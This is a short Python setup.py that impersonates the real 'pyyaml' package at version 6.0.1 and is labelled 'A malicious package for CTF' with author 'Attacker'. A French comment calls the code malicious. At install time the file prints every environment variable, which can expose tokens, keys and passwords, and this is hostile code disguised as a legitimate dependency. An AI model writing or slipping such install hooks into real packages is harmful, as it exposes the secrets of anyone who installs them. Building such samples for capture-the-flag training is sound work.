from setuptools import setup
import os

# Code malveillant pour imprimer toutes les variables d'environnement
print("Toutes les variables d'environnement :")
for key, value in os.environ.items():
    print(f"{key}: {value}")

setup(
    name='pyyaml',
    version='6.0.1',
    description='A malicious package for CTF',
    author='Attacker',
    packages=['malicious_package'],
)
